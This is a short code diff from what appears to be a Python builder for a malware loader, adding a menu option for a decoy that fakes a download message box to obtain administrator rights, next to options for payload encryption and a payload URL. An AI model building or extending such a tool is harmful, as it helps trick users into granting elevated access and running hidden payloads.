@@ -34,6 +34,18 @@ def set_payload_encryption():
 
     return PayloadEncryption
 
+def set_decoy():
+    Decoy = input("""\nSet Decoy Function:
+    1. Ask For Admin With Fake Download Message Box  
+    2. No Decoy Function
+
+    >> """)
+    if Decoy == "1":
+        Decoy = "DecoySpells/DecoyFunction.h"
+    else:
+        Decoy = "null"
+    return Decoy
+
 def set_url():
     Url = input("""\nSet Payload Url or type local For localhost:8000 (test): 
 
